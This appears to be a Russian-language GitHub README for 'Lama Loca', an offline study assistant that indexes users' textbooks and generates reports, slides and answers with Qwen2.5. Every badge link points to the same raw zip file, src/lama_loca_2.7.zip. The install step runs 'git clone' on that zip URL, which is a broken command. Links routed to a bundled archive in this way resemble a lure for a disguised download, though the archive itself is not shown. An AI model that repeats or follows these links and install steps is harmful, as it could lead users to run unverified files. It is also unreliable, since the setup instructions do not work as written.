<div align="center">

# 📚 Lama Loca — Study AI Assistant

### Локальный ИИ, который учится по вашим книгам

[![Python 3.9+](https://img.shields.io/badge/Python-3.9+-blue.svg)](https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Gradio](https://img.shields.io/badge/GUI-Gradio-orange.svg)](https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip)
[![LLM](https://img.shields.io/badge/LLM-Qwen2.5-purple.svg)](https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip)

**Загрузи свои учебники → Получи отчёты, презентации, конспекты и ответы на вопросы**

*Всё работает полностью офлайн. Ваши данные не покидают компьютер.*

</div>

---

## ✨ Возможности

| | Функция | Описание |
|:---:|---------|----------|
| 💬 | **Чат** | Задавайте вопросы по книгам — ответы в реальном времени (стриминг) |
| 📝 | **Отчёты** | Академические отчёты с введением, анализом и выводами (DOCX + MD) |
| 📊 | **Презентации** | Готовые PowerPoint-файлы (PPTX) с 10-15 слайдами |
| 📋 | **Конспекты** | Структурированные конспекты с ключевыми тезисами |
| ✍️ | **Эссе** | Академические эссе с аргументацией и контраргументами |
| 🔬 | **Критический анализ** | Глубокий разбор темы: сильные/слабые стороны, выводы |
| 📖 | **Подготовка к экзаменам** | Определения, вопросы с ответами, шпаргалки |

---

## 🏗️ Архитектура

```
  📚 Книги (PDF / EPUB / DOCX / TXT / FB2 / HTML / MD)
         │
         ▼
  ┌──────────────┐
  │  📄 Парсер   │   Загрузка и извлечение текста
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │  ✂️ Чанкинг  │   Разбиение на фрагменты (1500 символов, overlap 300)
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │  🧠 E5-Large │   Мультиязычные эмбеддинги (intfloat/multilingual-e5-large)
  └──────┬───────┘
         ▼
  ┌──────────────┐
  │  💾 ChromaDB │   Персистентная векторная база данных
  └──────┬───────┘
         │
    Запрос пользователя ──────────────┐
         │                            │
         ▼                            ▼
  ┌──────────────┐           ┌──────────────┐
  │  🔍 Поиск    │  Top-15   │  🎯 Reranker │  Cross-Encoder → Top-8
  └──────┬───────┘           └──────┬───────┘
         │                          │
         └──────────┬───────────────┘
                    ▼
             ┌──────────────┐
             │  🤖 LLM      │   Qwen2.5 (до 32B), контекст 32K
             └──────┬───────┘
                    ▼
             ┌──────────────┐
             │  📁 Экспорт  │   DOCX / PPTX / Markdown
             └──────────────┘
```

---

## 🚀 Быстрый старт

### 1. Клонирование и установка

```bash
git clone https://raw.githubusercontent.com/gmygpt/lama-loca/main/src/lama_loca_2.7.zip
cd lama-loca
chmod +x setup.sh
./setup.sh
```

Скрипт установки автоматически:
- Создаст виртуальное окружение
- Установит все зависимости
- Определит RAM и предложит оптимальную модель
- Скачает модель (по вашему согласию)

### 2. Запуск

```bash
source venv/bin/activate
python main.py
```

Откроется GUI в браузере на `http://localhost:7860` 🎉

### 3. Использование

1. **Вкладка «Книги»** — загрузите свои учебники (drag & drop)
2. **Нажмите «Индексировать»** — система проанализирует и запомнит содержимое
3. **Задавайте вопросы** в чате или **создавайте документы** по темам из книг

---

## 🔥 Что делает систему мощной

| Компонент | Технология | Эффект |
|:---------:|-----------|--------|
| 🤖 **LLM** | Qwen2.5 до 32B (GGUF, квантизация Q4_K_M) | Генерация текста на уровне коммерческих моделей |
| 📐 **Контекст** | 32 768 токенов | Модель «видит» и анализирует огромные объёмы текста |
| 🧠 **Эмбеддинги** | E5-Large Multilingual | Высокоточный семантический поиск на русском |
| 🎯 **Реранкер** | Cross-Encoder (ms-marco) | Точная фильтрация: из 15 кандидатов → 8 лучших |
| 🎛️ **Sampling** | temp=0.3, top_p=0.9, repeat_penalty=1.15 | Точные, связные, не повторяющиеся ответы |
| 🖥️ **GUI** | Gradio (веб-интерфейс) | Удобная работа без командной строки |

---

## 📦 Рекомендуемые модели

| Модель | Размер | RAM | Качество |
|--------|--------|-----|----------|
| **Qwen2.5-32B-Instruct** Q4_K_M | ~20 GB | 24+ GB | 🏆 Максимальное |
| **Qwen2.5-14B-Instruct** Q4_K_M | ~9 GB | 12+ GB | ⭐ Отличное |
| **Qwen2.5-7B-Instruct** Q4_K_M | ~5 GB | 8+ GB | 👍 Хорошее |
| **Qwen2.5-3B-Instruct** Q4_K_M | ~2.5 GB | 4+ GB | Базовое |

> 💡 Скрипт `setup.sh` определяет объём RAM вашей системы и рекомендует оптимальную модель.

### Ручная установка модели

```bash
pip install huggingface-hub
# Пример для 14B (отличное качество):
huggingface-cli download Qwen/Qwen2.5-14B-Instruct-GGUF \
    qwen2.5-14b-instruct-q4_k_m.gguf \
    --local-dir models/ --local-dir-use-symlinks False
mv models/qwen2.5-14b-instruct-q4_k_m.gguf models/model.gguf
```

---

## 📂 Структура проекта

```
lama-loca/
├── main.py                        # 🖥️ GUI-приложение (Gradio)
├── config.py                      # ⚙️ Все настройки
├── setup.sh                       # 📦 Скрипт установки
├── requirements.txt               # 📋 Зависимости Python
├── src/
│   ├── llm_engine.py              # 🤖 LLM движок (llama-cpp-python)
│   ├── knowledge_base.py          # 🧠 RAG + Reranker + ChromaDB
│   ├── document_generator.py      # 📝 Генератор DOCX / Markdown
│   └── presentation_generator.py  # 📊 Генератор PPTX
├── books/                         # 📚 Ваши книги (не в git)
├── models/                        # 🤖 GGUF модель (не в git)
├── output/                        # 📁 Готовые документы (не в git)
└── data/                          # 💾 Векторная БД (не в git)
```

---

## ⚡ GPU ускорение

По умолчанию все слои модели загружаются на GPU (`LLM_GPU_LAYERS = -1`).

**Нет GPU?** В `config.py`:
```python
LLM_GPU_LAYERS = 0  # только CPU
```

**NVIDIA GPU + CUDA:**
```bash
pip install llama-cpp-python --force-reinstall --no-cache-dir \
    -C cmake.args="-DGGML_CUDA=ON"
```

---

## 🛠️ Настройка

Все параметры в [`config.py`](config.py):

| Параметр | По умолчанию | Описание |
|----------|-------------|----------|
| `LLM_CONTEXT_SIZE` | 32768 | Размер контекста (токены) |
| `LLM_MAX_TOKENS` | 4096 | Макс. длина ответа |
| `LLM_TEMPERATURE` | 0.3 | Температура (0 = точнее, 1 = креативнее) |
| `LLM_GPU_LAYERS` | -1 | GPU слои (-1 = все, 0 = CPU) |
| `CHUNK_SIZE` | 1500 | Размер фрагмента текста |
| `RETRIEVAL_TOP_K` | 15 | Кандидатов при поиске |
| `RERANK_TOP_K` | 8 | Финальных результатов после реранкинга |

---

## 📄 Лицензия

[MIT](LICENSE) — используйте свободно.

---

<div align="center">

**Сделано с ❤️ и ИИ**

*Если проект полезен — поставьте ⭐*

</div>
